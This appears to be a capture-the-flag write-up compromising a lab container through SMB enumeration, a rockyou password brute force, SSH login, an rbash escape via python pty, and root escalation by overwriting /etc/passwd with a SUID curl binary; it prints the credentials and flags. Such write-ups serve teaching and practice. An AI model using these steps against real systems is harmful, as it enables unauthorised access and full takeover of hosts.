# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.065 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.032 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1026ms
rtt min/avg/max/mdev = 0.032/0.048/0.065/0.016 ms
```
## Ports scanning
``` sh
sudo nmap -p- --open --min-rate 5000 -T4 -n -Pn -sS -sCV 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 12:49 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a8:62:07:af:8e:77:13:6d:25:0a:2f:43:63:de:38:38 (ECDSA)
|_  256 93:93:a8:35:0e:fa:3e:05:04:27:70:2e:fc:22:e8:99 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 22:10:58:AD:F1:17 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-10-02T15:49:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.84 seconds
```
# SMB enumeration
## Null session
### Shares
``` sh
smbmap -H 172.17.0.2 -p 445

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 0 authenticated session(s)

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        share_secret_only                                       NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (b1ddee2c5c04 server (Samba, Ubuntu))
[*] Closed 1 connections
```
### Users
``` sh
nxc smb 172.17.0.2 --users
SMB         172.17.0.2      445    B1DDEE2C5C04     [*] Unix - Samba (name:B1DDEE2C5C04) (domain:B1DDEE2C5C04) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         172.17.0.2      445    B1DDEE2C5C04     -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         172.17.0.2      445    B1DDEE2C5C04     smbuser                       2024-09-02 12:05:42 0
SMB         172.17.0.2      445    B1DDEE2C5C04     [*] Enumerated 1 local users: B1DDEE2C5C04
```
``` sh
enum4linux 172.17.0.2 | grep 'Local User'
Password:
S-1-22-1-1000 Unix User\smbuser (Local User)
S-1-22-1-1001 Unix User\rabol (Local User)
S-1-5-21-1840187538-2764463472-2599016216-501 B1DDEE2C5C04\nobody (Local User)
S-1-5-21-1840187538-2764463472-2599016216-1000 B1DDEE2C5C04\smbuser (Local User)
```
### Brute force
``` sh
nxc smb 172.17.0.2 -u smbuser -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
SMB         172.17.0.2      445    B1DDEE2C5C04     [+] B1DDEE2C5C04\smbuser:fuckit
```
## Smbuser session
### Shares
``` sh
smbmap -H 172.17.0.2 -p 445 -u "smbuser" -p "fuckit"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)

[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        share_secret_only                                       READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (b1ddee2c5c04 server (Samba, Ubuntu))
[*] Closed 1 connections
```
``` sh
smbclient //172.17.0.2/share_secret_only -U "smbuser" --password="fuckit"
smb: \> ls
  .                                   D        0  Mon Sep  2 09:05:05 2024
  ..                                  D        0  Mon Sep  2 09:05:05 2024
  note.txt                            N       13  Mon Sep  2 09:05:05 2024

                51420848 blocks of size 1024. 3216276 blocks available
smb: \> get note.txt
getting file \note.txt of size 13 as note.txt (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)
smb: \> exit
cat nota.txt
read better
```
``` sh
smbclient //172.17.0.2/print$ -U "smbuser" --password="fuckit"
smb: \> ls
  .                                   D        0  Mon Sep  2 09:07:41 2024
  ..                                  D        0  Mon Sep  2 09:07:41 2024
  ARM64                               D        0  Mon Sep  2 09:07:41 2024
  W32MIPS                             D        0  Mon Apr  8 11:49:25 2024
  x64                                 D        0  Mon Sep  2 09:07:41 2024
  COLOR                               D        0  Mon Apr  8 11:49:25 2024
  IA64                                D        0  Mon Apr  8 11:49:25 2024
  W32X86                              D        0  Mon Sep  2 09:07:41 2024
  color                               D        0  Mon Sep  2 09:07:41 2024
  W32PPC                              D        0  Mon Apr  8 11:49:25 2024
  WIN40                               D        0  Mon Apr  8 11:49:25 2024
  W32ALPHA                            D        0  Mon Apr  8 11:49:25 2024

                51420848 blocks of size 1024. 3216272 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
smb: \> exit
```
All directories are empty
### Users
``` sh
nxc smb 172.17.0.2 -u smbuser -p fuckit --users
SMB         172.17.0.2      445    B1DDEE2C5C04     [*] Unix - Samba (name:B1DDEE2C5C04) (domain:B1DDEE2C5C04) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         172.17.0.2      445    B1DDEE2C5C04     [+] B1DDEE2C5C04\smbuser:fuckit
SMB         172.17.0.2      445    B1DDEE2C5C04     -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         172.17.0.2      445    B1DDEE2C5C04     smbuser                       2024-09-02 12:05:42 0
SMB         172.17.0.2      445    B1DDEE2C5C04     [*] Enumerated 1 local users: B1DDEE2C5C04
```
# SSH
When trying to login as smbuser i found an interesting message
``` sh
ssh smbuser@172.17.0.2
**************************************************
*   WARNING: Unauthorized Access is Prohibited!  *
*   This system is for authorized users only.    *
*   All activities are monitored and recorded.   *
*                  by fuckit                     *
**************************************************
```
Login failed with the credentials i found before but i found out *fuckit* is a possible user.
``` sh
ssh rabol@172.17.0.2
```
Login successful with *rabol:share_secret_only* 
The hint was the note.txt
``` sh
sudo -l
-rbash: sudo: command not found
```
# Exit rbash
``` sh
python3
>>> import pty; pty.spawn("/bin/bash")
whoami
bash: whoami: command not found
echo $PATH
/home/rabol/bin
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:$PATH
rabol@b1ddee2c5c04:~$ id
uid=1001(rabol) gid=1001(rabol) groups=1001(rabol),100(users)
```
# User flag
``` sh
cat user.txt
04aee8d6f21f746d0655233aa1d1541a
```
# Privilege escalation
## SUID
``` sh
find / -perm -4000 2>/dev/null
/usr/bin/curl
```
``` sh
sed 's/root:x:/root::/g' /etc/passwd > /tmp/passwd
curl file:///tmp/passwd -o /etc/passwd
cat /etc/passwd | grep root
root::0:0:root:/root:/bin/bash
```
``` sh
su -
whoami
root
```
# Root flag
``` sh
cat /root/root.txt
1e4e4054308a62a2bbaacd02074f1ad2
```
